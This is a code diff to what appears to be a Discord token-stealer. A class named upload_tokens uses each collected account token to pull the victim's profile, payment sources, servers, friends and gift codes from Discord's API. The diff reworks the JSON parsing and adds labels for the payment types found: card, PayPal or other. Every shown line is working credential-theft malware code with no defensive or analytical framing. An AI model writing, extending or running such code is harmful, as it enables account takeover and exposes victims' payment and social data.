@@ -216,11 +216,17 @@ class upload_tokens:
             return
 
         for token in self.tokens:
-            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
-            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
-            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
-            friends = requests.get('https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
-            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()
+            userx = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).text
+            billingx = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).text
+            guildsx = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).text
+            friendsx = requests.get('https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).text
+            gift_codesx = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).text
+            
+            user = json.loads(userx)
+            billing = json.loads(billingx)
+            guilds = json.loads(guildsx)
+            friends = json.loads(friendsx)
+            gift_codes = json.loads(gift_codesx)
 
             username = user['username'] + '#' + user['discriminator']
             user_id = user['id']
@@ -245,9 +251,18 @@ class upload_tokens:
             if billing:
                 payment_methods = []
 
-                payment_methods.append('💳')
+                for method in billing:
+                    if method['type'] == 1:
+                        payment_methods.append('💳')
                     
+                    elif method['type'] == 2:
+                        payment_methods.append("<:paypal:973417655627288666>")
+
+                    else:
+                        payment_methods.append('❓')
+
                 payment_methods = ', '.join(payment_methods)
+
             else:
                 payment_methods = None
 
